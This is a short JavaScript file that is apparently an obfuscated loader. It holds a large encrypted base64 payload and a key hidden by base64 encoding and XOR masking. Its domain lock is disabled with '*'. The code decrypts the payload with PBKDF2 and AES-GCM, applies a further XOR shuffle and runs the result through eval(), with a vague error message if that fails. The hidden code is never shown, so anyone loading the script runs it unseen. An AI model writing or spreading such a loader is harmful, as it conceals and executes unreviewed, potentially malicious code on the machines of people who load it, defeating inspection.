(async function() {
    const _p = "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";
    const _authorized = "*";
    const _encK = "fGFqZ24=";
    
    // Domain Lock
    const currentHost = typeof window !== 'undefined' ? window.location.hostname : "";
    if (_authorized !== "*" && _authorized !== "") {
        const allowed = _authorized.split(",").map(d => d.trim());
        if (!allowed.some(d => currentHost.includes(d))) {
            console.error("DOMAIN NOT AUTHORIZED");
            return;
        }
    }

    try {
        const _raw = atob(_encK).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x0F)).join('');
        const HardenedDec = (function(){
            const IT = 100000;
            const S_SZ = 16;
            const I_SZ = 12;
            return {
                async run(base64, pw) {
                    const data = new Uint8Array(atob(base64).split("").map(c => c.charCodeAt(0)));
                    const salt = data.slice(0, S_SZ);
                    const iv = data.slice(S_SZ, S_SZ+I_SZ);
                    const encData = data.slice(S_SZ+I_SZ);
                    const enc = new TextEncoder();
                    const bKey = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveKey"]);
                    const key = await crypto.subtle.deriveKey({name:"PBKDF2",salt:salt,iterations:IT,hash:"SHA-512"},bKey,{name:"AES-GCM",length:256},false,["decrypt"]);
                    const dec = await crypto.subtle.decrypt({name:"AES-GCM",iv:iv},key,encData);
                    let s = Array.from(enc.encode(pw)).reduce((a, b) => a + b, 0);
                    const unshuffled = new Uint8Array(dec);
                    for(let i=0; i<unshuffled.length; i++) {
                        s = (s * 16807) % 2147483647;
                        unshuffled[i] = unshuffled[i] ^ (s & 0xFF);
                    }
                    return new TextDecoder().decode(unshuffled);
                }
            };
        })();

        const result = await HardenedDec.run(_p, _raw);
        eval(result);
    } catch(e) {
        console.error("ENVIRONMENT CHECK FAILED");
    }
})();
